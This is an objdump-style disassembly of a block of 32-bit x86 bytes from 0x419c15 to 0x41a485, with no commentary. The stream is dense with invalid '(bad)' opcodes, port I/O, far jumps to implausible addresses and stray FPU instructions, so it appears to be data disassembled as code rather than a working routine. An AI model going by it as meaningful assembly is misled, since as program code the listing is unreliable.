  419c15:	add    al,dl
  419c17:	lock out dx,eax
  419c19:	jmp    0xd1e3:0xf8e5cacf
  419c20:	rcr    ah,1
  419c22:	imul   DWORD PTR [esi-0x171b194b]
  419c28:	mov    ah,0xf4
  419c2b:	iret   
  419c2c:	enter  0xc1ca,0x2
  419c30:	(bad)  
  419c31:	shl    dh,cl
  419c33:	(bad)  
  419c35:	cli    
  419c36:	pop    es
  419c37:	add    dl,bh
  419c39:	or     ah,dl
  419c3b:	fdiv   st(5),st
  419c3d:	add    dl,dh
  419c3f:	retf   0xc6ae
  419c42:	fsubr  st(1),st
  419c44:	int3   
  419c45:	call   0xf03280fb
  419c4a:	int    0xf2
  419c4c:	clc    
  419c4d:	jecxz  0x419c0d
  419c4f:	add    bh,BYTE PTR [eax-0x2d3cfa27]
  419c55:	out    0xe1,eax
  419c57:	fstp   st(2)
  419c59:	out    dx,eax
  419c5a:	or     dh,bl
  419c5c:	or     al,0x11
  419c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c5f:	lods   eax,DWORD PTR ds:[esi]
  419c60:	(bad)  
  419c61:	xlat   BYTE PTR ds:[ebx]
  419c62:	rcl    ebp,cl
  419c64:	hlt    
  419c65:	not    dl
  419c67:	enter  0xb7ec,0xf9
  419c6b:	fstp   st(5)
  419c6d:	mov    ecx,0xf8bdd4b7
  419c72:	add    eax,0xf4e30ada
  419c77:	out    0xe,eax
  419c79:	or     dl,ch
  419c7b:	add    eax,0xe3cd0ed8
  419c80:	out    0xdc,eax
  419c82:	loopne 0x419c51
  419c84:	out    0xe6,al
  419c86:	in     al,dx
  419c87:	shl    dh,cl
  419c89:	int    0xd2
  419c8b:	in     al,0xd6
  419c8d:	cmc    
  419c8e:	aad    0xbd
  419c90:	fidivr WORD PTR [edi-0x3d34fd19]
  419c96:	aad    0x5
  419c98:	cmc    
  419c99:	fsubr  st,st(4)
  419c9b:	in     al,0xea
  419c9d:	or     al,0xbc
  419c9f:	ror    bh,cl
  419ca1:	(bad)
  419ca4:	xlat   BYTE PTR ds:[ebx]
  419ca5:	mov    bh,0xca
  419ca7:	shr    cl,0xe4
  419caa:	(bad)  
  419cac:	mov    ebp,0xc2f1d302
  419cb1:	mov    edi,0xf0bd05f1
  419cb6:	fdivr  st,st(6)
  419cb8:	out    0xfb,eax
  419cba:	(bad)
  419cbd:	pop    es
  419cbe:	(bad)
  419cc1:	cmc    
  419cc2:	int    0xf2
  419cc4:	hlt    
  419cc5:	enter  0xecb6,0xc9
  419cc9:	retf   0xe8ca
  419ccc:	mov    ch,0xf9
  419cce:	cmc    
  419ccf:	mov    eax,0xd404d4e6
  419cd4:	cld    
  419cd5:	push   ebp
  419cd7:	enter  0xdff9,0x3
  419cdb:	fist   DWORD PTR [ebx]
  419cdd:	retf   0xdfd0
  419ce0:	iret   
  419ce1:	lds    esi,FWORD PTR [ecx-0x481b1405]
  419ce7:	clc    
  419ce8:	stc    
  419ce9:	out    dx,al
  419cea:	int3   
  419ceb:	sar    cl,1
  419ced:	(bad)  
  419cef:	into   
  419cf0:	mul    dl
  419cf2:	fdivp  st(1),st
  419cf4:	fdiv   st,st(4)
  419cf6:	in     al,0x9
  419cf8:	mov    ebp,0xdedeca02
  419cfd:	jmp    0xde1f6fb3
  419d02:	shr    edi,0xe4
  419d05:	mov    cl,0xba
  419d07:	in     al,dx
  419d08:	(bad)  
  419d0a:	(bad)
  419d0d:	retf   0xc101
  419d10:	out    dx,al
  419d11:	fstp   st(7)
  419d13:	(bad)  
  419d14:	clc    
  419d15:	add    bh,bl
  419d17:	lock add ch,ch
  419d1a:	add    bh,ah
  419d1c:	add    al,0xb
  419d1e:	mov    dl,0xcd
  419d20:	mov    ebp,0xe5b6eca8
  419d25:	fcmovnbe st,st(6)
  419d27:	mov    eax,0xbbbfd2c4
  419d2c:	shr    cl,cl
  419d2e:	ret    0xfef4
  419d31:	(bad)  
  419d33:	add    eax,0xd50ad2c7
  419d38:	sti    
  419d39:	cmc    
  419d3a:	fisttp DWORD PTR [ebx*8-0x291d10ef]
  419d41:	enter  0xe5b7,0xe7
  419d45:	loopne 0x419d1c
  419d47:	jmp    0xdf2d683d
  419d4c:	mov    ch,0xe9
  419d4e:	add    ch,al
  419d50:	(bad)  
  419d51:	in     al,dx
  419d52:	sti    
  419d53:	ret    0xd1f2
  419d56:	cmc    
  419d57:	aad    0xdb
  419d59:	loopne 0x419d30
  419d5b:	push   es
  419d5c:	in     al,dx
  419d5d:	fsubr  st(6),st
  419d5f:	shl    DWORD PTR [edi-0x35080c1e],0xcf
  419d66:	mov    edx,0xbaf2d5d8
  419d6b:	icebp  
  419d6c:	int3   
  419d6d:	imul   esi
  419d6f:	add    edx,edi
  419d71:	loope  0x419d70
  419d73:	ret    
  419d74:	lock out 0xc9,al
  419d77:	pi2fd  mm3,mm7
  419d7b:	fcmove st,st(1)
  419d7d:	add    ch,cl
  419d7f:	fmul   st(5),st
  419d81:	icebp  
  419d82:	mov    cl,0xf6
  419d84:	ret    0xbaee
  419d87:	(bad)
  419d8a:	enter  0xd2e3,0x3
  419d8e:	loop   0x419d71
  419d90:	aad    0xdb
  419d92:	repnz clc 
  419d94:	(bad)  
  419d95:	hlt    
  419d96:	neg    al
  419d98:	enter  0xfcde,0xc2
  419d9c:	rcl    ebx,cl
  419d9e:	mov    eax,0xf4c9f2b8
  419da3:	leave  
  419da4:	fucomi st,st(0)
  419da6:	lds    esi,FWORD PTR [eax-0x152f0d0e]
  419dac:	mov    ah,0xdd
  419dae:	loop   0x419d6c
  419db0:	ret    
  419db1:	mov    esp,0xcbddf2d4
  419db6:	mov    edi,0xc8d5c4ef
  419dbb:	adc    ebx,eax
  419dbd:	(bad)  
  419dbe:	shr    DWORD PTR [edi-0x2f2a141d],1
  419dc4:	shr    esp,cl
  419dc6:	mov    dh,0xb6
  419dc8:	int3   
  419dc9:	stc    
  419dca:	cld    
  419dcb:	mov    ecx,0xd6f901c8
  419dd0:	(bad)  
  419dd2:	add    eax,0xc902e4d0
  419dd7:	add    eax,0xdfeb0908
  419ddc:	in     al,0xd3
  419dde:	jmp    0x419dbe
  419de0:	mov    cl,0xd3
  419de2:	not    ebp
  419de4:	sar    bl,0xc0
  419de7:	mov    ebx,0xfcceceb6
  419dec:	add    dh,ch
  419dee:	mov    edi,0xf3d4d1f3
  419df3:	mov    edx,0xebdc0ae4
  419df8:	push   es
  419df9:	in     al,0x6
  419dfb:	in     al,dx
  419dfc:	enter  0xd100,0xc6
  419e00:	in     al,0xa4
  419e02:	out    dx,al
  419e03:	into   
  419e04:	shr    esi,0xcd
  419e07:	mov    cl,0xff
  419e09:	in     al,0xf2
  419e0b:	fnstcw WORD PTR [ebx-0x1d1221]
  419e11:	add    ecx,eax
  419e13:	cld    
  419e14:	not    dh
  419e16:	in     al,0xc7
  419e18:	or     cl,bl
  419e1a:	add    ch,dl
  419e1c:	fisttp QWORD PTR [esi]
  419e1e:	int    0xbf
  419e20:	ret    
  419e21:	(bad)  
  419e22:	jmp    0xf5eb:0xf3d9e5e3
  419e29:	enter  0xd0c9,0xd8
  419e2d:	mov    al,0xfa
  419e2f:	shl    cl,1
  419e31:	loope  0x419df4
  419e33:	mul    ebp
  419e35:	out    0xe1,al
  419e37:	lock (bad) 
  419e39:	dec    BYTE PTR [ecx]
  419e3b:	or     cl,BYTE PTR [eax]
  419e3d:	fsubr  st(1),st
  419e3f:	mov    cl,0xe6
  419e41:	mov    dh,0xad
  419e43:	int    0xc6
  419e45:	in     eax,dx
  419e46:	sti    
  419e47:	jmp    0xfb415e3c
  419e4c:	sti    
  419e4d:	int    0x0
  419e4f:	fidivr DWORD PTR [eax-0x3e333c2f]
  419e55:	rol    dl,1
  419e57:	out    dx,eax
  419e58:	stc    
  419e59:	fcmovne st,st(1)
  419e5b:	jmp    ebx
  419e5d:	int3   
  419e5e:	mov    dl,0xc4
  419e60:	ret    
  419e61:	(bad)  
  419e62:	aad    0xc4
  419e64:	repnz retf 0xb6c9
  419e68:	in     al,dx
  419e69:	lds    esi,FWORD PTR [ebp-0xe2b0e10]
  419e6f:	ret    
  419e70:	hlt    
  419e71:	shl    dh,1
  419e73:	bnd ret 
  419e75:	aam    0xd4
  419e77:	dec    ebx
  419e79:	stc    
  419e7a:	std    
  419e7b:	(bad)  
  419e7d:	or     cl,al
  419e7f:	shr    ch,0xec
  419e82:	(bad)
  419e85:	loop   0x419e4f
  419e87:	shl    bl,1
  419e89:	in     eax,0xf5
  419e8b:	(bad)  [ebp-0x4a452e1f]
  419e91:	ret    0xd2cd
  419e94:	(bad)  
  419e96:	xlat   BYTE PTR ds:[ebx]
  419e97:	test   BYTE PTR [eax],0xd4
  419e9a:	aam    0xf4
  419e9c:	sti    
  419e9d:	push   es
  419e9e:	jmp    0xd1f17c87
  419ea3:	cmc    
  419ea4:	jmp    0xfb367a82
  419ea9:	in     al,0xf9
  419eab:	clc    
  419eac:	mov    cl,0xe3
  419eae:	(bad)  
  419eb0:	call   edx
  419eb2:	loopne 0x419ead
  419eb4:	retf   
  419eb5:	or     edi,edi
  419eb7:	sti    
  419eb8:	(bad)
  419ebb:	loop   0x419ec6
  419ebd:	loop   0x419e84
  419ebf:	loopne 0x419eb0
  419ec1:	retf   
  419ec2:	loop   0x419e98
  419ec4:	jmp    0xb9fd5292
  419ec9:	clc    
  419eca:	push   ebx
  419ecc:	call   0xb5fb56c1
  419ed1:	mov    edi,0xd407d003
  419ed6:	rcr    ch,0xfb
  419ed9:	fdivrp st(4),st
  419edb:	leave  
  419edc:	or     edi,ebx
  419ede:	in     eax,0xcc
  419ee0:	(bad)
  419ee4:	mov    dh,0xcb
  419ee6:	fcmove st,st(7)
  419ee8:	shl    esp,1
  419eea:	enter  0xc3f6,0xf2
  419eee:	loope  0x419ef2
  419ef0:	icebp  
  419ef1:	jecxz  0x419eb2
  419ef3:	int3   
  419ef4:	cmc    
  419ef5:	add    edx,ecx
  419ef7:	loopne 0x419f08
  419ef9:	(bad)  
  419efa:	retf   0xd0f
  419efd:	jmp    0xc2314bf1
  419f02:	mov    cl,0xc3
  419f04:	jecxz  0x419eea
  419f06:	(bad)  
  419f07:	mov    ch,0xec
  419f09:	in     eax,0xbe
  419f0b:	stc    
  419f0c:	lock in eax,dx
  419f0e:	call   0x3d980b
  419f13:	mov    esi,0xefdec6f0
  419f18:	or     bh,cl
  419f1a:	push   es
  419f1b:	enter  0xea12,0xe9
  419f1f:	jmp    0xf6e0:0xefccecc3
  419f26:	(bad)
  419f29:	jmp    ebp
  419f2b:	cmc    
  419f2c:	cld    
  419f2d:	lock test eax,0xc3fdd3d5
  419f34:	shl    edx,cl
  419f36:	in     al,0xc7
  419f38:	test   DWORD PTR [edi],0xee1fed8
  419f3e:	sar    DWORD PTR [eax-0x5509423a],1
  419f44:	out    dx,eax
  419f45:	mov    edx,0xd5e8f8db
  419f4a:	mov    dh,0xf0
  419f4c:	mov    ebx,0xd303b9ef
  419f51:	aam    0x2
  419f53:	repz rcl edx,1
  419f56:	cmc    
  419f57:	in     eax,0xf4
  419f59:	neg    al
  419f5b:	int3   
  419f5c:	int    0xe1
  419f5e:	loopne 0x419f06
  419f60:	lods   al,BYTE PTR ds:[esi]
  419f61:	mov    dh,0xe3
  419f63:	in     al,0xb6
  419f65:	iret   
  419f66:	mov    dh,0xcb
  419f68:	sar    BYTE PTR [esi-0x2a2e0602],1
  419f6e:	(bad)  
  419f70:	cld    
  419f71:	repz xlat BYTE PTR ds:[ebx]
  419f73:	(bad)  
  419f74:	mul    ecx
  419f76:	loope  0x419f76
  419f78:	jmp    0x80c945f
  419f7d:	add    ecx,esi
  419f7f:	mov    dl,0xae
  419f81:	leave  
  419f82:	rol    edi,cl
  419f84:	hlt    
  419f85:	les    esi,FWORD PTR [edi-0x42240e0f]
  419f8b:	xlat   BYTE PTR ds:[ebx]
  419f8c:	fcmovnbe st,st(7)
  419f8e:	fprem  
  419f90:	iret   
  419f91:	int    0xd0
  419f93:	jecxz  0x419f57
  419f95:	mov    eax,0xdbe7e5d7
  419f9a:	sti    
  419f9b:	clc    
  419f9c:	(bad)  
  419f9d:	int    0xd0
  419f9f:	into   
  419fa0:	out    0xbe,eax
  419fa2:	mov    al,0xd4
  419fa4:	lock iret 
  419fa6:	(bad)  
  419fa7:	int    0xf3
  419fa9:	repz sti 
  419fab:	lock ret 
  419fad:	mul    eax
  419faf:	mov    esp,0xecdbe7c3
  419fb4:	clc    
  419fb5:	add    cl,bl
  419fb7:	pop    es
  419fb8:	fisttp DWORD PTR [edi]
  419fba:	cld    
  419fbb:	lds    eax,FWORD PTR [ecx]
  419fbd:	call   0xd8137c89
  419fc2:	rol    ch,cl
  419fc4:	icebp  
  419fc5:	shl    esi,0xf3
  419fc8:	enter  0xb9cb,0xd9
  419fcc:	aam    0xf8
  419fce:	out    dx,eax
  419fcf:	clc    
  419fd0:	(bad)  
  419fd1:	in     eax,dx
  419fd2:	loop   0x419fb0
  419fd4:	add    eax,DWORD PTR [ebx]
  419fd6:	icebp  
  419fd7:	out    dx,eax
  419fd8:	psubq  mm3,mm7
  419fdb:	ret    0xe0c
  419fde:	(bad)  
  419fe0:	lods   al,BYTE PTR ds:[esi]
  419fe1:	out    0xf2,eax
  419fe3:	loopne 0x419fb9
  419fe5:	mov    al,0xf7
  419fe7:	aam    0xc4
  419fe9:	fistp  QWORD PTR [edi-0x93cfc35]
  419fef:	mov    eax,0xfc0100c1
  419ff4:	ret    0x8f0
  419ff7:	or     bh,bl
  419ff9:	les    eax,FWORD PTR ds:0xd20508f3
  419fff:	loope  0x419fc2
  41a001:	jecxz  0x419fd2
  41a003:	scas   al,BYTE PTR es:[edi]
  41a004:	loope  0x419fef
  41a006:	in     al,dx
  41a007:	hlt    
  41a008:	mov    edi,0xbccacdce
  41a00d:	mov    ah,0xff
  41a00f:	fcmovnbe st,st(4)
  41a011:	loope  0x41a00d
  41a013:	mov    edx,0xeac2fdd4
  41a018:	loopne 0x41a010
  41a01a:	add    al,0xdf
  41a01c:	iret   
  41a01d:	loop   0x419fe5
  41a01f:	ror    edx,cl
  41a021:	mov    cl,0xb6
  41a023:	out    0xdb,al
  41a025:	xlat   BYTE PTR ds:[ebx]
  41a026:	rcr    cl,1
  41a028:	call   0xea1f9d0c
  41a02d:	cmc    
  41a02e:	add    al,ch
  41a030:	clc    
  41a031:	cli    
  41a032:	cli    
  41a033:	fdecstp 
  41a035:	loope  0x41a00f
  41a037:	aam    0x4
  41a039:	(bad)  
  41a03a:	fmul   DWORD PTR [eax]
  41a03c:	fmul   st(6),st
  41a03e:	loopne 0x41a023
  41a040:	(bad)  
  41a041:	icebp  
  41a042:	mov    dl,0xf4
  41a044:	cli    
  41a045:	out    dx,eax
  41a046:	mov    ecx,0xd4dbfbba
  41a04b:	std    
  41a04c:	not    ebx
  41a04e:	fsubrp st(0),st
  41a050:	out    dx,al
  41a051:	fadd   DWORD PTR [ebx]
  41a053:	(bad)  
  41a054:	repnz (bad) 
  41a056:	leave  
  41a057:	(bad)  
  41a058:	aam    0xfd
  41a05a:	or     eax,ebx
  41a05c:	iret   
  41a05d:	movsx  ebp,BYTE PTR [edx+esi*4-0x4b1c5020]
  41a065:	sar    bl,0xba
  41a068:	aam    0xdb
  41a06a:	fmul   st,st(0)
  41a06c:	std    
  41a06d:	jmp    0xd9c5:0xb4f5f8fe
  41a074:	out    0xe0,eax
  41a076:	in     al,0x9
  41a078:	(bad)  
  41a079:	jmp    0x41a088
  41a07b:	ret    0xecce
  41a07e:	(bad)  
  41a07f:	leave  
  41a080:	lods   al,BYTE PTR ds:[esi]
  41a081:	iret   
  41a082:	out    0xc8,al
  41a084:	ror    cl,cl
  41a086:	mov    edx,0xb8c6d8d0
  41a08b:	fsubp  st(6),st
  41a08d:	loop   0x41a092
  41a08f:	shr    bh,0xb8
  41a092:	(bad)  
  41a093:	sti    
  41a094:	jmp    0xfbe7:0xc4e0d0b8
  41a09b:	pop    es
  41a09c:	add    eax,0xe9ecf0c0
  41a0a1:	mov    esp,0xb0b1e5f0
  41a0a6:	mov    cl,0xf0
  41a0a8:	xlat   BYTE PTR ds:[ebx]
  41a0a9:	mov    edi,0xdffee9ed
  41a0ae:	ffreep st(0)
  41a0b0:	aad    0xf5
  41a0b2:	std    
  41a0b3:	add    bl,al
  41a0b5:	(bad)  
  41a0b6:	stc    
  41a0b7:	(bad)  
  41a0b9:	enter  0x7f9,0xdf
  41a0bd:	or     eax,0xaddde6c9
  41a0c2:	stos   DWORD PTR es:[edi],eax
  41a0c3:	out    dx,eax
  41a0c4:	mov    cl,0xcf
  41a0c6:	cli    
  41a0c7:	fnstcw WORD PTR [eax-0x352f2e22]
  41a0cd:	into   
  41a0ce:	in     eax,dx
  41a0cf:	add    dl,dh
  41a0d1:	fmul   st,st(5)
  41a0d3:	rol    cl,1
  41a0d5:	sti    
  41a0d6:	add    al,0xe3
  41a0d8:	aam    0xb
  41a0da:	add    eax,0xcd0fe1fb
  41a0df:	mov    dl,0xcc
  41a0e1:	loopne 0x41a099
  41a0e3:	mov    dl,0xb0
  41a0e6:	fcomi  st,st(5)
  41a0e8:	mov    edi,0xf9ddbacb
  41a0ed:	stc    
  41a0ee:	in     al,dx
  41a0ef:	rol    BYTE PTR [edi],cl
  41a0f1:	mov    ebp,0x2e4f3f4
  41a0f6:	xlat   BYTE PTR ds:[ebx]
  41a0f7:	sti    
  41a0f8:	fldln2 
  41a0fa:	(bad)  
  41a0fb:	or     al,0xe2
  41a0fd:	add    dh,cl
  41a0ff:	(bad)
  41a102:	out    0xd0,eax
  41a104:	rcl    al,cl
  41a106:	retf   0xfaee
  41a109:	repz iret 
  41a10b:	repnz int3 
  41a10d:	icebp  
  41a10e:	imul   ch
  41a110:	mov    ecx,0xffdef3f6
  41a115:	loopne 0x41a108
  41a117:	out    dx,eax
  41a118:	sti    
  41a119:	jecxz  0x41a0f6
  41a11b:	fcom   DWORD PTR [edx]
  41a11d:	jmp    0xd5c6:0xbcd2e0e6
  41a124:	retf   0xdad2
  41a127:	les    esi,FWORD PTR [esi-0xc053349]
  41a12d:	loope  0x41a0e9
  41a12f:	repnz (bad) 
  41a131:	jecxz  0x41a138
  41a133:	dec    bl
  41a135:	(bad)  
  41a137:	lds    eax,FWORD PTR [ecx]
  41a139:	in     al,0x4
  41a13b:	ret    0xdd09
  41a13e:	int3   
  41a13f:	(bad)  
  41a140:	out    0xe2,al
  41a142:	in     al,dx
  41a143:	in     al,dx
  41a144:	mov    dh,0xc6
  41a146:	retf   0xdef7
  41a149:	(bad)
  41a14c:	neg    al
  41a14e:	fdivr  st(3),st
  41a150:	add    ch,dh
  41a152:	pop    es
  41a153:	loopne 0x41a11a
  41a155:	retf   0xa0b
  41a158:	add    esp,ebx
  41a15a:	retf   0xe7d9
  41a15d:	out    0xcc,eax
  41a15f:	rol    ebx,0xb0
  41a162:	repnz int 0xf0
  41a165:	shr    ecx,cl
  41a167:	(bad)  
  41a168:	jmp    0x41a12e
  41a16a:	push   DWORD PTR [esi-0x1c01252b]
  41a170:	sti    
  41a171:	icebp  
  41a172:	lds    edi,FWORD PTR [esi+0x70607d7]
  41a178:	bsf    ebx,ebx
  41a17b:	push   cs
  41a17c:	add    eax,0xeacbecce
  41a181:	retf   0xeae4
  41a184:	jmp    0xb9cf:0xc8f5c9bb
  41a18b:	aad    0xb8
  41a18d:	enter  0xfed2,0xff
  41a191:	lock sar eax,1
  41a194:	repz inc DWORD PTR [esi]
  41a197:	sti    
  41a198:	fild   WORD PTR ds:0xedf9ccde
  41a19e:	in     al,0xed
  41a1a0:	idiv   BYTE PTR [esi-0x1e4c4c0a]
  41a1a6:	in     eax,0xd1
  41a1a8:	shr    BYTE PTR [esp+eiz*8-0x2d22262e],cl
  41a1af:	inc    BYTE PTR [esi]
  41a1b1:	idiv   BYTE PTR [ebp-0x61bff27]
  41a1b7:	(bad)  
  41a1b8:	jmp    0xaacc:0xe4f3f40b
  41a1bf:	iret   
  41a1c0:	les    esi,FWORD PTR [ebx-0x111e3f14]
  41a1c6:	iret   
  41a1c7:	shl    BYTE PTR [esi-0x35253732],0xc3
  41a1ce:	mov    esi,0x6f0e1ec
  41a1d3:	(bad)  
  41a1d4:	out    0x9,eax
  41a1d6:	shl    ebp,1
  41a1d8:	cld    
  41a1d9:	(bad)  
  41a1db:	fisttp QWORD PTR [esi]
  41a1dd:	in     al,dx
  41a1de:	shl    BYTE PTR [eax-0x3c0f1653],cl
  41a1e4:	hlt    
  41a1e5:	repz mov ebx,0xedbaf6ba
  41a1eb:	neg    bh
  41a1ed:	fdivp  st(4),st
  41a1ef:	pop    es
  41a1f0:	imul   esi
  41a1f2:	out    0xd7,al
  41a1f4:	mov    ecx,0x2fad5e2
  41a1f9:	in     eax,0xe8
  41a1fb:	int3   
  41a1fc:	loop   0x41a1f7
  41a1fe:	loope  0x41a1df
  41a200:	call   0xd3198cee
  41a205:	loope  0x41a1dc
  41a207:	lock call 0xd92572d3
  41a20d:	add    edi,DWORD PTR [ecx-0x132b462d]
  41a213:	add    al,BYTE PTR [edi]
  41a215:	loopne 0x41a1db
  41a217:	aam    0xd4
  41a219:	leave  
  41a21a:	(bad)  
  41a21b:	call   0xf2086e03
  41a220:	test   dl,0xf4
  41a223:	lods   al,BYTE PTR ds:[esi]
  41a224:	jmp    0xeff5:0xadf2afca
  41a22b:	repnz mov edi,0xd2dfe0bc
  41a231:	fnstcw WORD PTR [esi-0x243d293f]
  41a237:	call   0xf15aafc
  41a23c:	fst    QWORD PTR [edx]
  41a23e:	in     al,0xd2
  41a240:	retf   0xc0c6
  41a243:	rol    al,0xb6
  41a246:	lock int3 
  41a248:	mov    cl,0xf0
  41a24a:	(bad)  
  41a24c:	iret   
  41a24d:	out    dx,al
  41a24e:	add    ebx,edx
  41a250:	fiadd  WORD PTR [edi]
  41a252:	fstp   st(7)
  41a254:	xlat   BYTE PTR ds:[ebx]
  41a255:	cmc    
  41a256:	ret    0x1d0
  41a259:	or     BYTE PTR [eax],cl
  41a25b:	add    eax,0xeec307cc
  41a260:	loop   0x41a237
  41a262:	in     eax,0xcb
  41a264:	test   eax,0xd4cac7d6
  41a269:	cmc    
  41a26a:	enter  0xe3ed,0xcf
  41a26e:	sar    BYTE PTR [edx-0x2a393331],cl
  41a274:	sar    BYTE PTR [eax-0x1b200b1c],cl
  41a27a:	iret   
  41a27b:	fucomip st,st(2)
  41a27d:	int    0xc0
  41a27f:	in     al,dx
  41a280:	(bad)  
  41a282:	les    edi,FWORD PTR [ebp+ebp*4-0x2515374e]
  41a289:	fdivrp st(6),st
  41a28b:	mov    edx,0x2bcf6bc
  41a290:	jecxz  0x41a275
  41a292:	add    eax,edi
  41a294:	ret    
  41a295:	aad    0xdb
  41a297:	add    al,cl
  41a299:	call   0xe2259c88
  41a29e:	in     al,0xd3
  41a2a0:	enter  0xb1e6,0xc4
  41a2a4:	iret   
  41a2a5:	lock shl ebp,cl
  41a2a8:	idiv   BYTE PTR [esi-0x4f4b4322]
  41a2ae:	mov    bh,0xfa
  41a2b0:	int3   
  41a2b1:	shr    ch,0xe7
  41a2b4:	stc    
  41a2b5:	hlt    
  41a2b6:	out    0xdb,eax
  41a2b8:	paddw  mm4,mm2
  41a2bb:	add    eax,0xb2aaccfd
  41a2c0:	test   al,0xc8
  41a2c2:	jmp    0x41a2ad
  41a2c4:	cmc    
  41a2c5:	test   al,0xd0
  41a2c7:	out    0xd9,eax
  41a2c9:	shl    BYTE PTR [esi-0x30241141],cl
  41a2cf:	inc    eax
  41a2d1:	add    eax,0xf8dee6d0
  41a2d6:	clc    
  41a2d7:	(bad)  
  41a2d8:	invd   
  41a2da:	aad    0xc
  41a2dc:	or     ah,dh
  41a2de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2df:	(bad)
  41a2e2:	int3   
  41a2e3:	fld    TBYTE PTR [ebx+edi*4-0x1a061131]
  41a2ea:	mov    dh,0xbb
  41a2ec:	int3   
  41a2ed:	(bad)  
  41a2ef:	loope  0x41a2ce
  41a2f1:	int3   
  41a2f2:	out    0xf3,al
  41a2f4:	pop    es
  41a2f5:	jecxz  0x41a2be
  41a2f7:	mov    esi,0xddc4ee0e
  41a2fc:	(bad)  
  41a2fe:	icebp  
  41a2ff:	shr    ecx,cl
  41a301:	into   
  41a302:	ret    0xebc4
  41a305:	mov    cl,0xd9
  41a307:	icebp  
  41a308:	mov    bh,0xfe
  41a30a:	fnsetpm(287 only) 
  41a30c:	jmp    0xd3ff60f0
  41a311:	in     al,dx
  41a312:	in     al,dx
  41a313:	shr    bl,0xe4
  41a316:	(bad)  
  41a318:	imul   bl
  41a31a:	retf   0xe5ee
  41a31d:	ror    bh,cl
  41a31f:	mov    cl,0xb3
  41a321:	shr    BYTE PTR [esp+edx*8-0x38323e0d],0xb0
  41a329:	mov    edx,0xd1f8dcd7
  41a32e:	mov    bh,0xbe
  41a330:	(bad)  
  41a331:	rcl    ecx,cl
  41a333:	(bad)  
  41a334:	add    ch,dl
  41a336:	(bad)  
  41a337:	aad    0x9
  41a339:	add    edx,ebx
  41a33b:	add    al,ah
  41a33d:	fadd   st(1),st
  41a33f:	repnz shl edx,1
  41a342:	iret   
  41a343:	mov    ah,0xfa
  41a345:	in     al,dx
  41a346:	xlat   BYTE PTR ds:[ebx]
  41a347:	(bad)  
  41a348:	fnstenv [esi-0x300f2206]
  41a34e:	mov    ebx,0xf1dbdaf9
  41a353:	fld    DWORD PTR ds:0xed8d7d1
  41a359:	iret   
  41a35a:	int    0xf
  41a35c:	femms  
  41a35e:	shl    BYTE PTR [ebx-0x17132131],0xee
  41a365:	test   al,0xc7
  41a367:	stc    
  41a368:	fcmovnbe st,st(1)
  41a36a:	mov    bh,0xf0
  41a36c:	fstp   TBYTE PTR [esi-0x39421749]
  41a372:	in     al,0xf2
  41a374:	add    edx,edi
  41a376:	add    ch,al
  41a378:	stc    
  41a379:	add    eax,0xb0afe0c
  41a37e:	loope  0x41a32e
  41a380:	enter  0xbded,0xd4
  41a384:	mov    bh,0xba
  41a386:	int3   
  41a387:	fcomip st,st(6)
  41a389:	iret   
  41a38a:	hlt    
  41a38b:	mov    esi,0xfa01f1fc
  41a390:	cli    
  41a391:	(bad)  
  41a393:	icebp  
  41a394:	(bad)  
  41a396:	les    eax,FWORD PTR [ebx]
  41a398:	enter  0xe2f4,0xcc
  41a39c:	or     eax,0xa9ccdecd
  41a3a1:	out    0xf5,al
  41a3a3:	(bad)  [edx-0x4b280e39]
  41a3a9:	call   0xbf3a958c
  41a3ae:	fiadd  WORD PTR [eax]
  41a3b0:	clc    
  41a3b1:	cld    
  41a3b2:	mov    esp,0xf1dff7da
  41a3b7:	push   es
  41a3b8:	cli    
  41a3b9:	mov    esp,0xe1070004
  41a3be:	loop   0x41a3b3
  41a3c0:	lock cmc 
  41a3c2:	mov    al,0xe0
  41a3c4:	mov    cl,0xec
  41a3c6:	hlt    
  41a3c7:	mov    edx,0xf2cab4d4
  41a3cc:	hlt    
  41a3cd:	mul    edx
  41a3cf:	mov    esi,0xd9d3fefa
  41a3d4:	icebp  
  41a3d5:	(bad)  
  41a3d6:	lock loop 0x41a3bc
  41a3d9:	iret   
  41a3da:	fdivr  st,st(6)
  41a3dc:	fimul  DWORD PTR [esi]
  41a3de:	mov    cl,0xb3
  41a3e0:	mov    esp,0xfad4b3c0
  41a3e5:	in     eax,dx
  41a3e6:	(bad)  
  41a3e8:	in     al,dx
  41a3e9:	repnz mov ecx,0xbcdfbefb
  41a3ef:	out    0xe0,eax
  41a3f1:	push   es
  41a3f2:	cli    
  41a3f3:	mov    esi,0xbd803d7
  41a3f8:	lds    ecx,FWORD PTR [edi]
  41a3fa:	(bad)  
  41a3fb:	cld    
  41a3fc:	int3   
  41a3fd:	adc    edx,ebp
  41a3ff:	fdiv   DWORD PTR [edx-0x1153180a]
  41a405:	test   al,0xe7
  41a407:	(bad)  
  41a408:	lock enter 0xd6b8,0xf6
  41a40d:	fcmovnu st,st(6)
  41a40f:	repz rcl ch,0xfa
  41a413:	fmul   st,st(3)
  41a415:	(bad)  
  41a417:	les    eax,FWORD PTR [edi]
  41a419:	jmp    0xd8e7:0xff13e6ff
  41a420:	rcl    esi,0xc6
  41a423:	out    dx,eax
  41a424:	lock jmp 0x41a3dd
  41a427:	fcom   st(1)
  41a429:	mov    dh,0xd6
  41a42b:	enter  0xedd5,0xde
  41a42f:	fcomp  st(5)
  41a431:	rcl    edi,1
  41a433:	out    0xc3,eax
  41a435:	retf   0x8c2
  41a438:	add    DWORD PTR [ecx],ecx
  41a43a:	psubusw mm7,mm6
  41a43d:	loop   0x41a41e
  41a43f:	call   0xb2ff7af5
  41a444:	out    dx,al
  41a445:	rcr    bl,cl
  41a447:	leave  
  41a448:	xlat   BYTE PTR ds:[ebx]
  41a449:	in     eax,dx
  41a44a:	out    dx,al
  41a44b:	mov    esp,0xc0d7c8fe
  41a450:	icebp  
  41a451:	pop    es
  41a452:	add    bl,bh
  41a454:	fld    DWORD PTR [ebx]
  41a456:	fld    QWORD PTR [esp+edi*8]
  41a459:	in     eax,0xd8
  41a45b:	(bad)  
  41a45d:	out    dx,eax
  41a45e:	jecxz  0x41a451
  41a460:	mov    al,0xac
  41a462:	shl    BYTE PTR [ecx-0x33365757],cl
  41a468:	leave  
  41a469:	mov    edx,0xcce8def5
  41a46e:	stc    
  41a46f:	mov    edx,0xd0e4d3c7
  41a474:	repz hlt 
  41a476:	out    0xd6,eax
  41a478:	add    eax,0x5ddcbed
  41a47d:	cld    
  41a47e:	in     eax,dx
  41a47f:	retf   
  41a480:	out    0xe3,al
  41a482:	lock idiv bl
  41a485:	iret   
